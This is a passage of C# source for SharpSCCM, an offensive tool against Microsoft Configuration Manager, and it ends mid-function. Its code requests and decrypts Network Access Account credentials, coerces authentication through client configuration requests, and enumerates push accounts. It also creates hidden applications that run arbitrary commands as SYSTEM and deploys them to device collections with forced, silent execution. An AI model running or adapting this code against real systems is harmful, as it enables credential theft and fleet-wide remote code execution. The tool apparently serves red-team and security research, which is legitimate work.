using System;
using System.Collections.Generic;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;
using System.CommandLine.NamingConventionBinder;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Xml;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;

namespace SharpSCCM
{
     static class Program
    {
        // Functions that interact with a site server

        static void AddDeviceToCollection(ManagementScope scope, string deviceName, string collectionName)
        {
            Console.WriteLine($"[+] Adding {deviceName} to {collectionName}");
            ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
            newCollectionRule["QueryExpression"] = $"SELECT * FROM SMS_R_System WHERE Name='{deviceName}'";
            newCollectionRule["RuleName"] = $"{deviceName}_{Guid.NewGuid()}";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
            foreach (ManagementObject collection in searcher.Get())
            {
                ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
                addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
            }
            Console.WriteLine($"[+] Added {deviceName} to {collectionName}");
            GetCollectionMember(scope, collectionName, false, null, null, false, false);
        }

        static void AddUserToCollection(ManagementScope scope, string userName, string collectionName)
        {
            Console.WriteLine($"[+] Adding {userName} to {collectionName}");
            ManagementObject newCollectionRule = new ManagementClass(scope, new ManagementPath("SMS_CollectionRuleQuery"), null).CreateInstance();
            newCollectionRule["QueryExpression"] = $"SELECT * FROM SMS_R_User WHERE UniqueUserName='{userName}'";
            newCollectionRule["RuleName"] = $"{userName}_{Guid.NewGuid()}";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
            foreach (ManagementObject collection in searcher.Get())
            {
                ManagementBaseObject addMembershipRuleParams = collection.GetMethodParameters("AddMembershipRule");
                addMembershipRuleParams.SetPropertyValue("collectionRule", newCollectionRule);
                collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
            }
            Console.WriteLine($"[+] Added {userName} to {collectionName}");
            GetCollectionMember(scope, collectionName, false, null, null, false, false);
        }

        static void GenerateCCR(string server, string sitecode, string target)
        {
            ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
            Console.WriteLine($"[+] Generating a client configuration request (CCR) to coerce authentication to {target}");
            ManagementClass collectionClass = new ManagementClass(sccmConnection, new ManagementPath("SMS_Collection"), null);
            ManagementBaseObject generatorParams = collectionClass.GetMethodParameters("GenerateCCRByName");
            generatorParams.SetPropertyValue("Name", target);
            generatorParams.SetPropertyValue("PushSiteCode", sitecode);
            generatorParams.SetPropertyValue("Forced", false);
            collectionClass.InvokeMethod("GenerateCCRByName", generatorParams, null);
        }

        static void GetCollectionMember(ManagementScope scope, string name, bool count, string[] properties, string orderBy, bool dryRun, bool verbose)
        {
            // Get CollectionID from name
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT CollectionID FROM SMS_Collection WHERE Name='{name}'"));
            ManagementObjectCollection collections = searcher.Get();
            if (collections.Count > 0)
            {
                foreach (ManagementObject collection in collections)
                {
                    GetClassInstances(scope, "SMS_CollectionMember_a", count, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", orderBy, dryRun, verbose);
                }
            }
            else
            {
                Console.WriteLine($"[+] Found 0 instances of SMS_Collection with Name: {name}");
            }
        }

        static void GetNetworkAccessAccounts(string server, string sitecode)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Get certificates from local machine
            MessageCertificateX509 signingCertificate = GetSigningCertificate();
            MessageCertificateX509 encryptionCertificate = GetEncryptionCertificate();
            //MessageCertificateX509 certificate = CreateUserCertificate();

            // Register a new client. Using existing client does not work, likely because the certificate does not match what the server expects
            //SmsClientId clientId = RegisterClient(certificate, null, server, sitecode);
            //SendDDR(certificate, null, server, sitecode, clientId);

            // Send request for policy assignments to obtain policy locations
            ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();

            // Add our certificate for message signing and encryption
            assignmentRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
            assignmentRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
            //assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);

            SmsClientId clientId = GetSmsId();
            assignmentRequest.SmsId = clientId;
            assignmentRequest.Settings.HostName = server;
            assignmentRequest.Settings.Compression = MessageCompression.Zlib;
            assignmentRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            assignmentRequest.SiteCode = sitecode;
            assignmentRequest.SerializeMessageBody();
            Console.WriteLine($"[+] Obtaining {assignmentRequest.RequestType} {assignmentRequest.ResourceType} policy assignment from {assignmentRequest.Settings.HostName} {assignmentRequest.SiteCode}");
            Console.WriteLine($"\n[+] Policy assignment request body:\n{System.Xml.Linq.XElement.Parse("<root>" + assignmentRequest.Body + "</root>")}");
            ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
            Console.WriteLine($"\n[+] Policy assignment reply body:\n {assignmentReply.Body}");

            // Send request to download the body of the assigned policies
            ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);

            // Add our certificate for message signing and encryption
            policyDownloadRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
            policyDownloadRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
            //policyDownloadRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);

            // Discover local properties
            policyDownloadRequest.Discover();
            policyDownloadRequest.SmsId = clientId;
            policyDownloadRequest.DownloadSecrets = true;
            policyDownloadRequest.Settings.HostName = server;
            policyDownloadRequest.Settings.Compression = MessageCompression.Zlib;
            policyDownloadRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            policyDownloadRequest.SiteCode = sitecode;
            policyDownloadRequest.SerializeMessageBody();
            Console.WriteLine($"[+] Sending policy download request to {policyDownloadRequest.Settings.HostName}:{policyDownloadRequest.SiteCode}");
            //Console.WriteLine($"[+] Policy request body:\n{System.Xml.Linq.XElement.Parse("<root>" + policyDownloadRequest.Body + "</root>")}");
            //foreach (var attachment in policyDownloadRequest.Attachments)
            //{
            //    Console.WriteLine(attachment.Body);
            //}
            ConfigMgrPolicyBodyDownloadReply policyDownloadReply = policyDownloadRequest.SendMessage(sender);
            Console.WriteLine("\n[+] Policy download reply body:\n");
            foreach (PolicyBody policyBody in policyDownloadReply.ReplyPolicyBodies)
            {
                //Console.WriteLine(policyBody.RawPolicyText);
                if (policyBody.RawPolicyText.Contains("NetworkAccess"))
                {
                    XmlDocument policyXmlDoc = new XmlDocument();
                    policyXmlDoc.LoadXml(policyBody.RawPolicyText.Trim().Remove(0, 1));
                    string encryptedUsername = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.InnerText;
                    string encryptedPassword = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.NextSibling.InnerText;
                    Console.WriteLine($"\n[+] Encrypted NetworkAccessUsername: {encryptedUsername}");
                    Console.WriteLine($"\n[+] Encrypted NetworkAccessPassword: {encryptedPassword}");
                    /*
                    // Request MP certificates
                    ConfigMgrMPCertRequest certRequest = new ConfigMgrMPCertRequest();
                    certRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
                    certRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
                    certRequest.SmsId = clientId;
                    certRequest.Settings.HostName = server;
                    certRequest.Settings.Compression = MessageCompression.Zlib;
                    certRequest.Settings.ReplyCompression = MessageCompression.Zlib;
                    certRequest.SiteCode = sitecode;
                    certRequest.SerializeMessageBody();
                    Console.WriteLine($"\n[+] Requesting management point certificate for data decryption");
                    ConfigMgrMPCertReply certReply = certRequest.SendMessage(sender);
                    Console.WriteLine(certReply.MPCertificate.Certificate.PublicKey);
                    MessageCertificateX509Volatile certReplyCert = new MessageCertificateX509Volatile(certReply.MPCertificate.Certificate);
                    */
                    Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedUsername)))}");
                    Console.WriteLine($"\n[+] Decrypted NetworkAccessPassword: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedPassword)))}");
                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(certificate.Decrypt(StringToByteArray(encryptedUsername)))}");
                }
            }
        }

        static void GetSitePushSettings(string server, string sitecode)
        {
            ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
            ManagementObjectCollection results = searcher.Get();
            foreach (ManagementObject result in results)
            {
                if (result["PropertyName"].ToString() == "SETTINGS" && result["Value1"].ToString() == "Active")
                {
                    Console.WriteLine("[+] Automatic site-wide client push installation is enabled");
                }
                else if (result["PropertyName"].ToString() == "ENABLEKERBEROSCHECK" && result["Value"].ToString() == "3")
                {
                    Console.WriteLine("[+] Fallback to NTLM is enabled");
                }
                else if (result["PropertyName"].ToString() == "FILTERS")
                {
                    Console.WriteLine("[+] Install client software on the following computers:");
                    if (result["Value"].ToString() == "0")
                    {
                        Console.WriteLine("  Workstations and Servers (including domain controllers)");
                    }
                    else if (result["Value"].ToString() == "1")
                    {
                        Console.WriteLine("  Servers only (including domain controllers)");
                    }
                    else if (result["Value"].ToString() == "2")
                    {
                        Console.WriteLine("  Workstations and Servers (excluding domain controllers)");
                    }
                    else if (result["Value"].ToString() == "3")
                    {
                        Console.WriteLine("  Servers only (excluding domain controllers)");
                    }
                    else if (result["Value"].ToString() == "4")
                    {
                        Console.WriteLine("  Workstations and domain controllers only (excluding other servers)");
                    }
                    else if (result["Value"].ToString() == "5")
                    {
                        Console.WriteLine("  Domain controllers only");
                    }
                    else if (result["Value"].ToString() == "6")
                    {
                        Console.WriteLine("  Workstations only");
                    }
                    else if (result["Value"].ToString() == "7")
                    {
                        Console.WriteLine("  No computers");
                    }
                }
            }
            searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery($"SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
            results = searcher.Get();
            foreach (ManagementObject result in results)
            {
                foreach (string value in (string[])result["Values"])
                {
                    Console.WriteLine($"[+] Discovered client push installation account: {value}");

                }
            }
        }

        static SmsClientId GetSmsId()
        {
            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_Client"));
            string SmsId = null;
            foreach (ManagementObject instance in searcher.Get())
            {
                SmsId = instance["ClientId"].ToString();
            }
            Console.WriteLine($"[+] Obtained SmsId from local host: {SmsId}");
            return new SmsClientId(SmsId);
        }

        static void InvokeUpdate(ManagementScope scope, string collectionName)
        {
            Console.WriteLine($"[+] Forcing all members of {collectionName} to check for updates and execute any new applications available");
            ManagementClass clientOperation = new ManagementClass(scope, new ManagementPath("SMS_ClientOperation"), null);
            ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
            initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow

            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
            foreach (ManagementObject collection in searcher.Get())
            {
                initiateClientOpParams["TargetCollectionID"] = collection.GetPropertyValue("CollectionID");
            }
            clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
        }

        static void LocalGrepFile(string path, string stringToFind)
        {
            string[] lines = System.IO.File.ReadAllLines(path);
            foreach (string line in lines)
            {
                if (line.Contains(stringToFind))
                {
                    Console.WriteLine(line);
                }
            }
        }

        static void LocalPushLogs(string startTime, string startDate)
        {
            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\cimv2");
            DateTime startDateObj = DateTime.Parse(startDate);
        }

        static void LocalNetworkAccessAccounts()
        {
            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
            GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
            ManagementObjectCollection accounts = searcher.Get();
            if (accounts.Count > 0)
            {
                foreach (ManagementObject account in accounts)
                {
                    string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                    string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                    byte[] protectedUsernameBytes = StringToByteArray(protectedUsername);
                    int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                    Array.Resize(ref protectedUsernameBytes, length);
                    try
                    {

                        Dpapi.Execute(protectedUsername);
                        Dpapi.Execute(protectedPassword);

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                        Console.WriteLine(e.ToString());
                    }
                }
            }
            else
            {
                Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
            }
        }

        static void NewApplication(ManagementScope scope, string name, string path, bool runAsUser = false, bool stealth = false)
        {
            // Check for existing application before creating a new one
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{name}'"));
            ManagementObjectCollection applications = searcher.Get();
            if (applications.Count > 0)
            {
                foreach (ManagementObject application in applications)
                {
                    Console.WriteLine($"[+] There is already an application with the name {name}");
                }
            }
            else
            {
                Console.WriteLine($"[+] Creating new application: {name}");
                ManagementClass idInstance = new ManagementClass(scope, new ManagementPath("SMS_Identification"), null);
                ManagementBaseObject outParams = idInstance.InvokeMethod("GetSiteID", null, null);
                string siteId = outParams["SiteID"].ToString().Replace("{", "").Replace("}", "");
                string scopeId = $"ScopeId_{siteId}";
                string appId = $"Application_{Guid.NewGuid()}";
                string deploymentId = $"DeploymentType_{Guid.NewGuid()}";
                string fileId = $"File_{Guid.NewGuid()}";
                string xml = $@"<?xml version=""1.0"" encoding=""utf-16""?>
                <AppMgmtDigest xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">
                    <Application AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"">
                        <DisplayInfo DefaultLanguage=""en-US"">
                            <Info Language=""en-US"">
                                <Title>{name}</Title>
                                <Publisher/>
                                <Version/>
                            </Info>
                        </DisplayInfo>
                        <DeploymentTypes>
                            <DeploymentType AuthoringScopeId=""{scopeId}"" LogicalName=""{deploymentId}"" Version=""1""/>
                        </DeploymentTypes>
                        <Title ResourceId=""Res_665624387"">{name}</Title>
                        <Description ResourceId=""Res_215018014""/>
                        <Publisher ResourceId=""Res_433133800""/>
                        <SoftwareVersion ResourceId=""Res_486536226""/>
                        <CustomId ResourceId=""Res_167409166""/>
                    </Application>
                    <DeploymentType AuthoringScopeId=""{scopeId}"" LogicalName=""{deploymentId}"" Version=""1"">
                        <Title ResourceId=""Res_1643586251"">{name}</Title>
                        <Description ResourceId=""Res_1438196005""/>
                        <DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology>
                        <Technology>Script</Technology>
                        <Hosting>Native</Hosting>
                        <Installer Technology=""Script"">
                            <ExecutionContext>{(runAsUser ? "User" : "System")}</ExecutionContext>
                            <DetectAction>
                                <Provider>Local</Provider>
                                <Args>
                                    <Arg Name=""ExecutionContext"" Type=""String"">{(runAsUser ? "User" : "System")}</Arg>
                                    <Arg Name=""MethodBody"" Type=""String"">
                                        &lt;?xml version=""1.0"" encoding=""utf-16""?&gt;                                                                                       
                                            &lt;EnhancedDetectionMethod xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest""&gt;
                                                &lt;Settings xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest""&gt;
                                                    &lt;File Is64Bit=""true"" LogicalName=""{fileId}"" xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration""&gt;
                                                        &lt;Annotation xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules""&gt;
                                                            &lt;DisplayName Text="""" /&gt;
                                                            &lt;Description Text="""" /&gt;
                                                        &lt;/Annotation&gt;
                                                        &lt;Path&gt;C:\&lt;/Path&gt;
                                                        &lt;Filter&gt;asdf&lt;/Filter&gt;
                                                    &lt;/File&gt;
                                                &lt;/Settings&gt;
                                                &lt;Rule id=""{scopeId}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"" xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules""&gt;
                                                    &lt;Annotation&gt;
                                                        &lt;DisplayName Text="""" /&gt;
                                                        &lt;Description Text="""" /&gt;
                                                    &lt;/Annotation&gt;
                                                    &lt;Expression&gt;
                                                        &lt;Operator&gt;NotEquals&lt;/Operator&gt;
                                                        &lt;Operands&gt;
                                                            &lt;SettingReference AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"" DataType=""Int64"" SettingLogicalName=""{fileId}"" SettingSourceType=""File"" Method=""Count"" Changeable=""false"" /&gt;
                                                            &lt;ConstantValue Value=""0"" DataType=""Int64"" /&gt;
                                                        &lt;/Operands&gt;
                                                    &lt;/Expression&gt;
                                                &lt;/Rule&gt;
                                            &lt;/EnhancedDetectionMethod&gt;
                                    </Arg>
                                </Args>
                            </DetectAction>
                            <InstallAction>
                                <Provider>Script</Provider>
                                <Args>
                                    <Arg Name=""InstallCommandLine"" Type=""String"">{path}</Arg>
                                    <Arg Name=""WorkingDirectory"" Type=""String""/>
                                    <Arg Name=""ExecutionContext"" Type=""String"">{(runAsUser ? "User" : "System")}</Arg>
                                    <Arg Name=""RequiresLogOn"" Type=""String""/>
                                    <Arg Name=""RequiresElevatedRights"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""RequiresUserInteraction"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""RequiresReboot"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""UserInteractionMode"" Type=""String"">Hidden</Arg>
                                    <Arg Name=""PostInstallBehavior"" Type=""String"">BasedOnExitCode</Arg>
                                    <Arg Name=""ExecuteTime"" Type=""Int32"">0</Arg><Arg Name=""MaxExecuteTime"" Type=""Int32"">15</Arg>
                                    <Arg Name=""RunAs32Bit"" Type=""Boolean"">false</Arg>
                                    <Arg Name=""SuccessExitCodes"" Type=""Int32[]"">
                                        <Item>0</Item>
                                        <Item>1707</Item>
                                    </Arg>
                                    <Arg Name=""RebootExitCodes"" Type=""Int32[]"">
                                        <Item>3010</Item>
                                    </Arg>
                                    <Arg Name=""HardRebootExitCodes"" Type=""Int32[]"">
                                        <Item>1641</Item>
                                    </Arg>
                                    <Arg Name=""FastRetryExitCodes"" Type=""Int32[]"">
                                        <Item>1618</Item>
                                    </Arg>
                                </Args>
                            </InstallAction>
                            <CustomData>
                                <DetectionMethod>Enhanced</DetectionMethod>
                                <EnhancedDetectionMethod>
                                    <Settings xmlns=""http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"">
                                        <File xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"" Is64Bit=""true"" LogicalName=""{fileId}"">
                                            <Annotation xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"">
                                                <DisplayName Text=""""/>
                                                <Description Text=""""/>
                                            </Annotation>
                                            <Path>C:\</Path>
                                            <Filter>asdf</Filter>
                                        </File>
                                    </Settings>
                                    <Rule xmlns=""http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"" id=""{scope}/{deploymentId}"" Severity=""Informational"" NonCompliantWhenSettingIsNotFound=""false"">
                                        <Annotation>
                                            <DisplayName Text=""""/><Description Text=""""/>
                                        </Annotation>
                                        <Expression>
                                            <Operator>NotEquals</Operator>
                                            <Operands>
                                                <SettingReference AuthoringScopeId=""{scopeId}"" LogicalName=""{appId}"" Version=""1"" DataType=""Int64"" SettingLogicalName=""{fileId}"" SettingSourceType=""File"" Method=""Count"" Changeable=""false""/>
                                                <ConstantValue Value=""0"" DataType=""Int64""/>
                                            </Operands>
                                        </Expression>
                                    </Rule>
                                </EnhancedDetectionMethod>
                                <InstallCommandLine>{path}</InstallCommandLine>
                                <UninstallSetting>SameAsInstall</UninstallSetting>
                                <InstallFolder/>
                                <UninstallCommandLine/>
                                <UninstallFolder/>
                                <MaxExecuteTime>15</MaxExecuteTime>
                                <ExitCodes>
                                    <ExitCode Code=""0"" Class=""Success""/>
                                    <ExitCode Code=""1707"" Class=""Success""/>
                                    <ExitCode Code=""3010"" Class=""SoftReboot""/>
                                    <ExitCode Code=""1641"" Class=""HardReboot""/>
                                    <ExitCode Code=""1618"" Class=""FastRetry""/>
                                </ExitCodes>
                                <UserInteractionMode>Hidden</UserInteractionMode>
                                <AllowUninstall>true</AllowUninstall>
                            </CustomData>
                        </Installer>
                    </DeploymentType>
                </AppMgmtDigest>
                ";

                // Debug XML with assistance from Config Manager SDK
                //Application appInstance = SccmSerializer.DeserializeFromString(xml, true);
                //string xmla = SccmSerializer.SerializeToString(appInstance, true);

                ManagementObject application = new ManagementClass(scope, new ManagementPath("SMS_Application"), null).CreateInstance();
                //application["SDMPackageXML"] = xmla;
                application["SDMPackageXML"] = xml;
                if (stealth)
                {
                    application["IsHidden"] = true;
                    Console.WriteLine("[+] Updated application to hide it from the Configuration Manager console");
                }
                if (runAsUser)
                {
                    Console.WriteLine("[+] Updated application to run in the context of the logged on user");
                }
                application.Put();
                GetClassInstances(scope, "SMS_Application", false, null, $"LocalizedDisplayName='{name}'");
            }
        }

        static void NewCollection(ManagementScope scope, string collectionType, string collectionName)
        {
            Console.WriteLine($"[+] Creating new {collectionType} collection: {collectionName}");
            ManagementObject collection = new ManagementClass(scope, new ManagementPath("SMS_Collection"), null).CreateInstance();
            collection["Name"] = collectionName;
            collection["OwnedByThisSite"] = true;
            if (collectionType == "device")
            {
                collection["CollectionType"] = "2";
                collection["LimitToCollectionId"] = "SMS00001";
            }
            else
            {
                collection["CollectionType"] = "1";
                collection["LimitToCollectionId"] = "SMS00002";
            }
            collection.Put();
            GetClassInstances(scope, "SMS_Collection", false, null, $"Name='{collectionName}'");
        }

        static void NewDeployment(ManagementScope scope, string application, string collection)
        {
            // Check for existing deployment before creating a new one
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{application}' AND CollectionName='{collection}'"));
            ManagementObjectCollection deployments = searcher.Get();
            if (deployments.Count > 0)
            {
                foreach (ManagementObject deployed in deployments)
                {
                    Console.WriteLine($"[+] {application} already deployed to {collection}");
                }
            }
            else
            {
                Console.WriteLine($"[+] Creating new deployment of {application} to {collection}");
                string sitecode = scope.Path.ToString().Split('_').Last();
                string now = DateTime.Now.ToString("yyyyMMddHHmmss" + ".000000+***");
                ManagementObject deployment = new ManagementClass(scope, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
                deployment["ApplicationName"] = application;
                deployment["AssignmentName"] = $"{application}_{collection}_Install";
                deployment["AssignmentAction"] = 2; // APPLY
                deployment["AssignmentType"] = 2; // Application
                deployment["CollectionName"] = collection;
                deployment["DesiredConfigType"] = 1; // REQUIRED
                deployment["DisableMOMAlerts"] = true;
                deployment["EnforcementDeadline"] = now;
                deployment["LogComplianceToWinEvent"] = false;
                deployment["NotifyUser"] = false;
                deployment["OfferTypeID"] = 0; // REQUIRED
                deployment["OverrideServiceWindows"] = true;
                deployment["Priority"] = 2; // HIGH
                deployment["RebootOutsideOfServiceWindows"] = false;
                deployment["SoftDeadlineEnabled"] = true;
                deployment["SourceSite"] = sitecode;
                deployment["StartTime"] = now;
                deployment["SuppressReboot"] = 0;
                deployment["UseGMTTimes"] = true;
                deployment["UserUIExperience"] = false; // Do not display user notifications
                deployment["WoLEnabled"] = false; // Not including this one results in errors displayed in the console

                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{application}'"));
                ManagementObjectCollection applications = searcher.Get();
                Console.WriteLine($"[+] Found {applications.Count} applications named {application}");
                if (applications.Count > 0)
                {
                    foreach (ManagementObject applicationObj in applications)
                    {
                        deployment["AssignedCIs"] = new Int32[] { Convert.ToInt32(applicationObj.Properties["CI_ID"].Value) };
                    }
                }

                searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collection}'"));
                ManagementObjectCollection collections = searcher.Get();
                Console.WriteLine($"[+] Found {collections.Count} collections named {collection}");
                if (collections.Count > 0)
                {
                    foreach (ManagementObject collectionObj in collections)
                    {
                        deployment["TargetCollectionID"] = collectionObj.GetPropertyValue("CollectionID");
                    }
                }
                deployment.Put();
                GetClassInstances(scope, "SMS_ApplicationAssignment", false, null, $"ApplicationName='{application}' AND CollectionName='{collection}'");
            }
        }

        static ManagementScope NewSccmConnection(string path)
        {
            ConnectionOptions connection = new ConnectionOptions();
            ManagementScope sccmConnection = new ManagementScope(path, connection);
            try
            {
                Console.WriteLine($"[+] Connecting to {sccmConnection.Path}");
                sccmConnection.Connect();
            }
            catch (System.UnauthorizedAccessException unauthorizedErr)
            {
                Console.WriteLine("[!] Access to WMI was not authorized (user name or password might be incorrect): " + unauthorizedErr.Message);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error connecting to WMI: " + e.Message);
            }
            return sccmConnection;
        }

        static void RemoveApplication(ManagementScope scope, string applicationName)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{applicationName}'"));
            ManagementObjectCollection applications = searcher.Get();
            if (applications.Count > 0)
            {
                Console.WriteLine($"[+] Found {applications.Count} applications named {applicationName}");
                foreach (ManagementObject application in applications)
                {
                    application.InvokeMethod("SetIsExpired", new object[] { "True" });
                    application.Delete();
                }
                Console.WriteLine($"[+] Deleted all applications named {applicationName}");
                Console.WriteLine($"[+] Querying for applications named {applicationName}");
                string whereCondition = "LocalizedDisplayName='" + applicationName + "'";
                GetClassInstances(scope, "SMS_Application", false, null, whereCondition);
            }
            else
            {
                Console.WriteLine($"[+] Found {applications.Count} applications named {applicationName}");
            }
        }

        static void RemoveCollection(ManagementScope scope, string collection)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collection}'"));
            ManagementObjectCollection collections = searcher.Get();
            if (collections.Count > 0)
            {
                Console.WriteLine($"[+] Found {collections.Count} collections named {collection}");
                foreach (ManagementObject collectionObj in collections)
                {
                    collectionObj.Delete();
                }
                Console.WriteLine($"[+] Deleted all collections named {collection}");
                Console.WriteLine($"[+] Querying for applications named {collection}");
                string whereCondition = "Name='" + collection + "'";
                GetClassInstances(scope, "SMS_Collection", false, null, whereCondition);
            }
            else
            {
                Console.WriteLine($"[+] Found {collections.Count} applications named {collections}");
            }
        }

        static void RemoveDeployment(ManagementScope scope, string application, string collection)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{application}' AND CollectionName='{collection}'"));
            ManagementObjectCollection deployments = searcher.Get();
            if (deployments.Count > 0)
            {
                Console.WriteLine($"[+] Found deployment of {application} to {collection}");
                foreach (ManagementObject deployment in deployments)
                {
                    deployment.Delete();
                    Console.WriteLine($"[+] Deleted deployment of {application} to {collection}");
                }
                Console.WriteLine($"[+] Querying for deployments of {application} to {collection}");
                string whereCondition = "ApplicationName='" + application + "' AND CollectionName='" + collection + "'";
                GetClassInstances(scope, "SMS_ApplicationAssignment", false, null, whereCondition);
            }
            else
            {
                Console.WriteLine($"[+] Found {deployments.Count} deployments of {application} to {collection}");
            }
        }

        static void RemoveDevice(ManagementScope scope, string guid)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_R_SYSTEM WHERE SMSUniqueIdentifier='{guid}'"));
            ManagementObjectCollection devices = searcher.Get();
            if (devices.Count > 0)
            {
                foreach (ManagementObject device in devices)
                {
                    device.Delete();
                    Console.WriteLine($"[+] Deleted device with SMSUniqueIdentifier {guid}");
                }
            }
            else
            {
                Console.WriteLine($"[+] Found {devices.Count} devices with SMSUniqueIdentifier {guid}");
            }
        }

        // Utility Functions
        static void InvokeQuery(ManagementScope scope, string query)
        {
